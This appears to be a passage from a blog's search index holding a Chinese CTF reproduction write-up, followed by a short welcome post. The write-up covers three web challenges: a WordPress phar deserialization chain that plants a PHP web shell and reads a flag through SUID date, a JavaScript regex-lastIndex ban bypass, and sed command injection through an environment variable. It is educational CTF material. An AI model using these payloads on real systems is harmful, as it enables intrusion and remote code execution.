class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace </span><br><span class="line">&#123;</span><br><span class="line">    class WP_HTML_Token </span><br><span class="line">    &#123;</span><br><span class="line">        public $bookmark_name;</span><br><span class="line">        public $on_destroy;</span><br><span class="line">        </span><br><span class="line">        public function __construct($bookmark_name, $on_destroy) </span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;bookmark_name = $bookmark_name;</span><br><span class="line">            $this-&gt;on_destroy = $on_destroy;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $a = new WP_HTML_Token(&#x27;echo \&#x27;&lt;?=eval($_POST[1]);?&gt;\&#x27; &gt; /var/www/html/shell.php&#x27;, &#x27;system&#x27;);</span><br><span class="line"></span><br><span class="line">    $phar = new Phar(&quot;phar.phar&quot;); </span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;GIF89A&lt;?php XXX __HALT_COMPILER(); ?&gt;&quot;);</span><br><span class="line">    $phar-&gt;setMetadata($a);</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>然后上传phar文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">POST /wp-admin/admin-ajax.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8012</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Accept-Language: en-GB,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------92633278134516118923780781161</span><br><span class="line">Content-Length: 657</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">-----------------------------92633278134516118923780781161</span><br><span class="line">Content-Disposition: form-data; name=&quot;size_limit&quot;</span><br><span class="line"></span><br><span class="line">10485760</span><br><span class="line">-----------------------------92633278134516118923780781161</span><br><span class="line">Content-Disposition: form-data; name=&quot;action&quot;</span><br><span class="line"></span><br><span class="line">dnd_codedropz_upload</span><br><span class="line">-----------------------------92633278134516118923780781161</span><br><span class="line">Content-Disposition: form-data; name=&quot;type&quot;</span><br><span class="line"></span><br><span class="line">click</span><br><span class="line">-----------------------------92633278134516118923780781161</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload-file&quot;; filename=&quot;test.jpg&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&#123;&#123;file(/Users/exp10it/payload.phar)&#125;&#125;</span><br><span class="line">-----------------------------92633278134516118923780781161--</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后使用伪协议读取触发反序列化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php/video/?dl=&#123;&#123;base64(phar:///var/www/html/wp-content/uploads/wp_dndcf7_uploads/wpcf7-files/test.jpg/test.txt)&#125;&#125; HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8012</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后到&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php下连接shell，但是没有权限读取flag，需要suid提权。</p><p>suid是一种权限设置，允许用户在执行特定程序时以该程序的所有者的权限运行。当用户执行具有SUID位的可执行文件时，该进程将获得文件所有者的权限而不是执行进程的用户的权限。如果一个可执行文件设置了SUID位，这意味着当任何用户运行该文件时，它将具有文件所有者的权限，而不是运行它的用户的权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>上面命令是用来查找系统中所有属主为 <code>root</code> 且设置了 SUID 位的文件，并将它们的路径打印出来</p><p><img src="/pic/12.png" alt="img"></p><p>可以看到date<a href="https://gtfobins.github.io/gtfobins/date/#file-read">date | GTFOBins</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">date</span> -f /flag</span><br></pre></td></tr></table></figure><h1 id="Wait-What"><a href="#Wait-What" class="headerlink" title="Wait What?"></a>Wait What?</h1><p>这题是一个登录，并且以admin用户登录可以看到flag，那么就是如何使自己能以admin身份进入。我们可以进行注册，登录和封禁功能。由于admin被放入了禁止登录的名单内，所以我们要进行一个绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">let banned_users = []</span><br><span class="line">// 你不准getflag</span><br><span class="line">banned_users.push(&quot;admin&quot;)</span><br><span class="line"></span><br><span class="line">app.post(&quot;/api/flag&quot;, requireLogin, (req, res) =&gt; &#123;</span><br><span class="line">    let username = req.body.username</span><br><span class="line">    if (username !== &quot;admin&quot;) &#123;</span><br><span class="line">        res.send(&quot;登录成功，但是只有&#x27;admin&#x27;用户可以看到flag，你的用户名是&#x27;&quot; + username + &quot;&#x27;&quot;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    //...</span><br><span class="line"> &#125;)</span><br></pre></td></tr></table></figure><p>下面是封禁功能的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// 基于正则技术的封禁用户匹配系统的设计与实现</span><br><span class="line">let test1 = banned_users_regex.test(username)</span><br><span class="line">console.log(`使用正则$&#123;banned_users_regex&#125;匹配$&#123;username&#125;的结果为：$&#123;test1&#125;`)</span><br><span class="line">if (test1) &#123;</span><br><span class="line">    console.log(&quot;第一个判断匹配到封禁用户：&quot;,username)</span><br><span class="line">    res.send(&quot;用户&#x27;&quot;+username + &quot;&#x27;被封禁，无法鉴权！&quot;)</span><br><span class="line">    return</span><br><span class="line">&#125;</span><br><span class="line">// 基于in关键字的封禁用户匹配系统的设计与实现</span><br><span class="line">let test2 = (username in banned_users)</span><br><span class="line">console.log(`使用in关键字匹配$&#123;username&#125;的结果为：$&#123;test2&#125;`)</span><br><span class="line">if (test2)&#123;</span><br><span class="line">    console.log(&quot;第二个判断匹配到封禁用户：&quot;,username)</span><br><span class="line">    res.send(&quot;用户&#x27;&quot;+username + &quot;&#x27;被封禁，无法鉴权！&quot;)</span><br><span class="line">    return</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到有俩个waf，一个是正则匹配，另一个是in。</p><p>第二个基于in的关键词waf，由于这个不是python而是js，而js中的关键词in如果指定的属性在指定的对象中就会返回true，而banned_users属于数组，而数组中不存在admin属性，所以test2实际是判断banned_users中是否存在数组索引为username的值(由于对象的属性名称会被隐式转换为字符串，”0”和0都可以作为数组索引)，所以0 in [‘admin’]或者‘0’ in [‘admin’]都会返回true，所以这是个假的waf</p><p>第一个waf是一个正则表达式，使用了regex.test()函数，由于test()函数源码里面定义了g的全局变量[<a href="https://zhuanlan.zhihu.com/p/86384322">源码级解析]分析并解决JavaScript里RegExp类中test()方法结果不固定的情况 - 知乎 (zhihu.com)</a>，如果正则表达式设置了全局变量，那么连续执行test()方法，则下一个test方法的起始匹配位置从上一个test的末位置lastindex后面开始</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&gt; let r = /^admin$/g</span><br><span class="line"></span><br><span class="line">&gt; r.lastIndex</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">&gt; r.test(&quot;admin&quot;)</span><br><span class="line">true</span><br><span class="line"></span><br><span class="line">&gt; r.lastIndex</span><br><span class="line">5</span><br><span class="line"></span><br><span class="line">r.test(&quot;admin&quot;)</span><br><span class="line">false</span><br><span class="line"></span><br><span class="line">&gt; r.lastIndex</span><br><span class="line">0</span><br></pre></td></tr></table></figure><p>但是在app.use()中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// 每次请求前，更新封禁用户正则信息</span><br><span class="line">app.use(function (req, res, next) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        build_banned_users_regex()</span><br><span class="line">        console.log(&quot;封禁用户正则表达式（满足这个正则表达式的用户名为被封禁用户名）：&quot;,banned_users_regex)</span><br><span class="line">    &#125; catch (e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    next()</span><br><span class="line">&#125;)</span><br><span class="line">let banned_users_regex = null;</span><br><span class="line">function build_banned_users_regex() &#123;</span><br><span class="line">    let regex_string = &quot;&quot;</span><br><span class="line">    for (let username of banned_users) &#123;</span><br><span class="line">        regex_string += &quot;^&quot; + escapeRegExp(username) + &quot;$&quot; + &quot;|&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    regex_string = regex_string.substring(0, regex_string.length - 1)</span><br><span class="line">    banned_users_regex = new RegExp(regex_string, &quot;g&quot;)</span><br><span class="line">&#125;</span><br><span class="line">function escapeRegExp(string) &#123;</span><br><span class="line">    return string.replace(/[.*+?^$&#123;&#125;()|[\]\\]/g, &#x27;\\$&amp;&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会发现每次请求都会产生一个新的banned_users_regex，使得lastindex的位置恢复为0，但是如果能在赋值之前抛出异常即可绕过这个更新，如果在try里面build_banned_users_regex抛出异常则无法阻止更新，但是如果这个方法里面传入escapeRegExp(string)的参数不是string则会抛出typeerror错误，就可以引发错误阻止更新</p><p>所以具体做法就是先随便注册一个用户然后登录，然后访问&#x2F;api&#x2F;ban_user封禁用户，但是用户名得是对象，数组或者其他非string数据类型引发错误，然后访问&#x2F;api&#x2F;flag(用admin用户)正则匹配，test()的lastindex移到admin之后，然后再一次访问&#x2F;api&#x2F;flag即可拿到flag</p><h1 id="Webshell-Generator"><a href="#Webshell-Generator" class="headerlink" title="Webshell Generator"></a>Webshell Generator</h1><p>填写method和key后抓包发送可以看到返回了生成的webshell.php的文件绝对路径以及写入的内容是一句话，那么这里就可以使用任意文件下载，可以得到download.php，index.php以及generate.sh文件内容。</p><p>download.php文件内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">download.php:</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]) &amp;&amp; isset($_GET[&#x27;filename&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $filename = $_GET[&#x27;filename&#x27;];</span><br><span class="line">    header(&quot;Content-type: application/octet-stream&quot;);</span><br><span class="line">    header(&quot;Content-Disposition: attachment; filename=$filename&quot;);</span><br><span class="line">    readfile($file);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出会读取文件内容</p><p>index.php部分内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">security_validate();</span><br><span class="line">if (@$_POST[&#x27;method&#x27;] &amp;&amp; @$_POST[&#x27;key&#x27;] &amp;&amp; @$_POST[&#x27;filename&#x27;]) &#123;</span><br><span class="line">    if ($_POST[&#x27;language&#x27;] !== &#x27;PHP&#x27;) &#123;</span><br><span class="line">        die(&quot;PHP是最好的语言&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $method = $_POST[&#x27;method&#x27;];</span><br><span class="line">    $key = $_POST[&#x27;key&#x27;];</span><br><span class="line">    putenv(&quot;METHOD=$method&quot;) or die(&quot;你的method太复杂了！&quot;);</span><br><span class="line">    putenv(&quot;KEY=$key&quot;) or die(&quot;你的key太复杂了！&quot;);</span><br><span class="line">    $status_code = -1;</span><br><span class="line">    $filename = shell_exec(&quot;sh generate.sh&quot;);</span><br><span class="line">    if (!$filename) &#123;</span><br><span class="line">        die(&quot;生成失败了！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = trim($filename);</span><br><span class="line">    header(&quot;Location: download.php?file=$filename&amp;filename=&#123;$_POST[&#x27;filename&#x27;]&#125;&quot;);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到使用putenv设置环境变量后调用执行了generate.sh</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">generate.sh:</span><br><span class="line">#!/bin/sh</span><br><span class="line"></span><br><span class="line">set -e</span><br><span class="line"></span><br><span class="line">NEW_FILENAME=$(tr -dc a-z0-9 &lt;/dev/urandom | head -c 16)</span><br><span class="line">cp template.php &quot;/tmp/$NEW_FILENAME&quot;</span><br><span class="line">cd /tmp</span><br><span class="line"></span><br><span class="line">sed -i &quot;s/KEY/$KEY/g&quot; &quot;$NEW_FILENAME&quot;</span><br><span class="line">sed -i &quot;s/METHOD/$METHOD/g&quot; &quot;$NEW_FILENAME&quot;</span><br><span class="line"></span><br><span class="line">realpath &quot;$NEW_FILENAME&quot;</span><br></pre></td></tr></table></figure><p>下面是chat对上面脚本文件的解释</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1.#!/bin/sh: 这是一个Shebang行，指定了脚本要使用的解释器，这里是/bin/sh。</span><br><span class="line">2.set -e: 这个命令告诉Shell在脚本中任何命令的退出状态不为零时立即退出。这有助于在脚本中及早检测到错误并停止执行。</span><br><span class="line">3.NEW_FILENAME=$(tr -dc a-z0-9 &amp;lt;/dev/urandom | head -c 16): 这一行生成一个16个字符的随机文件名。tr -dc a-z0-9命令从/dev/urandom中读取字符流，然后head -c 16截取前16个字符，最终赋值给NEW_FILENAME变量。</span><br><span class="line">4.cp template.php &quot;/tmp/$NEW_FILENAME&quot;: 这一行复制名为template.php的文件到/tmp目录，并使用先前生成的随机文件名。</span><br><span class="line">5.cd /tmp: 进入/tmp目录，因为后续的sed命令将在这个目录中修改文件。</span><br><span class="line">6.sed -i &quot;s/KEY/$KEY/g&quot; &quot;$NEW_FILENAME&quot;: 这个sed命令用来在新生成的文件中替换所有的&quot;KEY&quot;字符串为脚本中定义的$KEY变量的值。</span><br><span class="line">7.sed -i &quot;s/METHOD/$METHOD/g&quot; &quot;$NEW_FILENAME&quot;: 类似地，这个命令替换所有的&quot;METHOD&quot;字符串为脚本中定义的$METHOD变量的值。</span><br><span class="line">8.realpath &quot;$NEW_FILENAME&quot;: 这个命令返回$NEW_FILENAME的绝对路径。在脚本的上下文中，这可能是为了提供生成的文件的完整路径。</span><br><span class="line"></span><br><span class="line">最终，脚本在/tmp目录生成一个新的PHP文件，基于template.php，并在这个新文件中替换了&quot;KEY&quot;和&quot;METHOD&quot;字符串为相应的变量值。最后，脚本输出新生成文件的绝对路径。</span><br></pre></td></tr></table></figure><p>这里使用sed -i “s&#x2F;KEY&#x2F;$KEY&#x2F;g” 来替换模板中的关键字，但是由于使用了双引号包裹(里面的变量或者特殊字符不被解释)无法进行shell命令注入，所以这里使用shell参数展开，这里我们传入key&#x3D;&#x2F;g;1e &#x2F;readflag;s&#x2F;&#x2F;，那么原本的替换语句就变成了sed -i “s&#x2F;&#x2F;g;1e &#x2F;readflag;s&#x2F;&#x2F;&#x2F;$KEY&#x2F;g”</p><p>s&#x2F;&#x2F;g是一个替换指令，由于替换模式为空所以实际上就是将所有内容进行空字符替换</p><p>1e &#x2F;readflag：是一个e指令可以执行系统命令，执行&#x2F;readflag，会将文件内容插入到输出文件的第一行</p><p>做法就是抓包将上面的key传入，然后知晓文件路径，再访问download.php读取上面的文件即可读出flag</p>]]></content>
      
      
      <categories>
          
          <category> 比赛复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>start</title>
      <link href="/start/"/>
      <url>/start/</url>
      
        <content type="html"><![CDATA[<p>Welcome to my blogs. As a rookie, I will wirte some blogs later, which are bout Hackjava, vulnerability analysis and CTF match reproduction.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">be a ctfer</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
